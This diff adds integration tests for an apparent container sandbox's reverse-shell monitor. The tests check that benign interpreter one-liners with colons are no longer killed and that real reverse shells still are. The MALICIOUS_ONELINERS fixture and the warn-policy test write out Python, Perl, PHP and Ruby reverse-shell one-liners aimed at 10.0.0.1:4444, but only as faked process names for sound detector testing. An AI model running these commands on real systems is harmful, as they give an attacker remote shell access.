@@ -108,6 +108,41 @@ file_read_rate_mb_per_sec = 10000
 
 
 @pytest.fixture
+def enable_monitoring_oneliner_warn():
+    """Enable monitoring with reverse_shell_one_liners = "warn" (#842).
+
+    Downgrades the interpreter one-liner reverse-shell class to WARNING (audited,
+    never kills), while auto_kill_on_critical stays on for the unambiguous class.
+    """
+    config_path = Path.home() / ".coi" / "config.toml"
+    backup = config_path.read_text() if config_path.exists() else None
+
+    config_path.parent.mkdir(parents=True, exist_ok=True)
+    config_path.write_text(
+        """
+[network]
+mode = "open"
+
+[monitoring]
+enabled = true
+auto_pause_on_high = true
+auto_kill_on_critical = true
+reverse_shell_one_liners = "warn"
+poll_interval_sec = 1
+file_read_threshold_mb = 500
+file_read_rate_mb_per_sec = 1000
+"""
+    )
+
+    yield config_path
+
+    if backup:
+        config_path.write_text(backup)
+    elif config_path.exists():
+        config_path.unlink()
+
+
+@pytest.fixture
 def enable_monitoring_low_thresholds():
     """Enable monitoring with default low thresholds for threshold-specific tests.
 
@@ -270,6 +305,38 @@ def cleanup_container(name, coi_binary):
     )
 
 
+# Issue #842 parametrize fixtures (module scope so decorators can reference them).
+# (slot, faked-command-line) — benign interpreter one-liners that MUST NOT be killed:
+# they contain colons (PATH, dict/JSON literals, timestamps) but no network endpoint.
+BENIGN_ONELINERS = [
+    (
+        70,
+        "source /home/code/.claude/shell-snapshots/snapshot-bash-1.sh 2>/dev/null || true "
+        "&& export PATH=/usr/local/bin:/usr/bin:/bin && python3 -c print({'result': 2 + 2})",
+    ),
+    (71, "python -c import json; print(json.dumps({'ok': 1}))"),
+    (72, "perl -e print scalar localtime, qq{ time: done\\n}"),
+    (73, "ruby -e puts({a: 1, b: 2}).inspect"),
+    (74, "php -r echo date('H:i:s');"),
+]
+
+# (slot, faked-command-line) — real reverse shells that MUST still be killed.
+# Each carries a genuine network indicator (socket keyword / IP / host:port).
+MALICIOUS_ONELINERS = [
+    (
+        75,
+        'python3 -c import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444))',
+    ),
+    (
+        76,
+        'perl -e use Socket;$i="10.0.0.1";$p=4444;'
+        'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"))',
+    ),
+    (77, 'php -r $s=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'),
+    (78, 'ruby -rsocket -e f=TCPSocket.open("10.0.0.1",4444)'),
+]
+
+
 class TestThreatDetection:
     """Test threat detection for different attack types."""
 
@@ -346,6 +413,193 @@ class TestThreatDetection:
         assert len(critical) > 0, f"Expected CRITICAL threat event, found {len(critical)}"
 
         cleanup_container(container_name, coi_binary)
+
+    # ------------------------------------------------------------------ #
+    # Issue #842: interpreter one-liners must not be kill-on-sight        #
+    # ------------------------------------------------------------------ #
+    #
+    # Agent Bash tools wrap every command in a shell-snapshot `source` line and
+    # quote code that almost always contains ':' (PATH entries like /usr/bin:/bin,
+    # dict/JSON literals like {"ok": True}, URLs, timestamps, log text). The
+    # reverse-shell detector used to treat a bare ':' as a network indicator, so
+    # EVERY interpreter one-liner pattern (`python -c`, `python3 -c`, `perl -e`,
+    # `ruby -e`, `php -r`) became kill-on-sight for agent-driven commands. The fix
+    # requires a REAL network indicator (socket/tcp/udp/connect keyword, an IP, or
+    # a host:port endpoint) before these patterns escalate to CRITICAL.
+    #
+    # Each argv[0] below is faked via `exec -a` (same mechanism as
+    # test_reverse_shell_detection) to reproduce the exact wrapped command line the
+    # monitor reads from /proc/<pid>/cmdline, without needing the real interpreter.
+    # The (slot, command-line) fixtures live at module scope (BENIGN_ONELINERS /
+    # MALICIOUS_ONELINERS) so the parametrize decorators can reference them.
+
+    @pytest.mark.parametrize(
+        "slot,wrapped", BENIGN_ONELINERS, ids=[f"slot{s}" for s, _ in BENIGN_ONELINERS]
+    )
+    def test_benign_interpreter_oneliner_not_killed(
+        self, test_workspace, enable_monitoring, coi_binary, slot, wrapped
+    ):
+        """A benign interpreter one-liner (colons but no network endpoint) must NOT
+        be treated as a reverse shell and must NOT kill the container (#842)."""
+        container_name, proc = self._start_shell(test_workspace, coi_binary, slot)
+        try:
+            self._inject_faked_process(container_name, wrapped)
+
+            # Give the monitor several poll cycles to (not) react.
+            time.sleep(8)
+
+            assert not container_absent(container_name), (
+                f"Benign one-liner {wrapped!r} was treated as a reverse shell and the "
+                "container was killed (regression of issue #842)"
+            )
+            state = get_container_state(container_name)
+            assert state == "Running", (
+                f"Container should stay Running for benign {wrapped!r}, got {state}"
+            )
+
+            events = get_threat_events(container_name)
+            reverse_shell_critical = [
+                e
+                for e in events
+                if e.get("level") == "critical"
+                and "reverse shell" in e.get("description", "").lower()
+            ]
+            assert not reverse_shell_critical, (
+                f"Unexpected reverse-shell CRITICAL event for benign command: "
+                f"{reverse_shell_critical}"
+            )
+        finally:
+            proc.terminate()
+            cleanup_container(container_name, coi_binary)
+
+    @pytest.mark.parametrize(
+        "slot,wrapped", MALICIOUS_ONELINERS, ids=[f"slot{s}" for s, _ in MALICIOUS_ONELINERS]
+    )
+    def test_interpreter_reverse_shell_still_killed(
+        self, test_workspace, enable_monitoring, coi_binary, slot, wrapped
+    ):
+        """A genuine interpreter reverse shell (socket/IP/host:port present) MUST
+        still be detected as CRITICAL and auto-kill the container after the #842
+        fix — the tightened heuristic must not create a blind spot."""
+        container_name, proc = self._start_shell(test_workspace, coi_binary, slot)
+        try:
+            self._inject_faked_process(container_name, wrapped)
+
+            killed = False
+            for _ in range(20):
+                time.sleep(1)
+                if container_absent(container_name):
+                    killed = True
+                    break
+
+            assert killed, (
+                f"Real reverse shell {wrapped!r} should be auto-killed, but container "
+                f"is {get_container_state(container_name)!r} (blind spot from #842 fix?)"
+            )
+
+            events = get_threat_events(container_name)
+            reverse_shell_critical = [
+                e
+                for e in events
+                if e.get("level") == "critical"
+                and "reverse shell" in e.get("description", "").lower()
+            ]
+            assert reverse_shell_critical, (
+                f"Expected a reverse-shell CRITICAL event for {wrapped!r}. Events: {events}"
+            )
+        finally:
+            proc.terminate()
+            cleanup_container(container_name, coi_binary)
+
+    def test_oneliner_warn_policy_downgrades_but_still_audits(
+        self, test_workspace, enable_monitoring_oneliner_warn, coi_binary
+    ):
+        """With reverse_shell_one_liners = "warn" (#842), a PURE interpreter
+        one-liner (a `python3 -c` carrying only a host:port endpoint, no
+        unambiguous socket indicator) is downgraded to WARNING: it is logged and
+        audited but does NOT kill the container. A one-liner that ALSO carries an
+        unambiguous indicator (socket.socket, fsockopen, ...) stays CRITICAL even
+        under warn — that strong-wins classification is covered by the Go
+        TestReverseShellOneLinerPolicy; the unambiguous class kill path is covered
+        by test_interpreter_reverse_shell_still_killed and
+        test_critical_threat_kills_container."""
+        container_name, proc = self._start_shell(test_workspace, coi_binary, 79)
+        try:
+            # Pure one-liner: matches `python3 -c` and trips the network gate via
+            # a host:port endpoint, but contains NO strong indicator, so it is the
+            # genuinely-downgradeable one-liner class.
+            self._inject_faked_process(
+                container_name,
+                "python3 -c __import__('pty').spawn('/bin/bash') # 10.0.0.1:4444",
+            )
+
+            # Give the monitor several poll cycles.
+            time.sleep(8)
+
+            # WARN must not kill or pause the container.
+            assert not container_absent(container_name), (
+                "warn policy must NOT kill the container on a one-liner reverse shell"
+            )
+            state = get_container_state(container_name)
+            assert state == "Running", f"warn policy should keep container Running, got {state}"
+
+            # But the threat must still be audited — as WARNING, not CRITICAL.
+            events = get_threat_events(container_name)
+            rs_events = [e for e in events if "reverse shell" in e.get("description", "").lower()]
+            assert rs_events, (
+                f"Expected an audited reverse-shell event under warn. Events: {events}"
+            )
+            assert any(e.get("level") == "warning" for e in rs_events), (
+                f"Expected a WARNING-level reverse-shell event under warn policy, got {rs_events}"
+            )
+            assert not any(e.get("level") == "critical" for e in rs_events), (
+                f"warn policy must not emit a CRITICAL reverse-shell event, got {rs_events}"
+            )
+        finally:
+            proc.terminate()
+            cleanup_container(container_name, coi_binary)
+
+    # ------------------------------------------------------------------ #
+    # Shared helpers for the #842 parametrized tests                      #
+    # ------------------------------------------------------------------ #
+
+    @staticmethod
+    def _start_shell(test_workspace, coi_binary, slot):
+        """Start a monitored `coi shell` in the given slot, wait until Running, and
+        let the monitoring baseline stabilize. Returns (container_name, proc)."""
+        proc = subprocess.Popen(
+            [coi_binary, "shell", "--workspace", test_workspace, "--slot", str(slot), "--debug"],
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+        container_name = (
+            get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + f"-{slot}"
+        )
+        if not wait_for_container_running(container_name, timeout=30):
+            proc.terminate()
+            pytest.skip(f"Container {container_name} not found or not running")
+        # Let the monitoring baseline stabilize before injecting.
+        time.sleep(10)
+        return container_name, proc
+
+    @staticmethod
+    def _inject_faked_process(container_name, wrapped):
+        """Spawn a long-lived process inside the container whose argv[0] is exactly
+        `wrapped`, so the host-side monitor reads it from /proc/<pid>/cmdline."""
+        subprocess.Popen(
+            [
+                "incus",
+                "exec",
+                container_name,
+                "--",
+                "bash",
+                "-c",
+                f"exec -a {json.dumps(wrapped)} sleep 30",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
 
     def test_env_scanning_detection(self, test_workspace, enable_monitoring, coi_binary):
         """Test environment scanning detection (WARNING level)."""
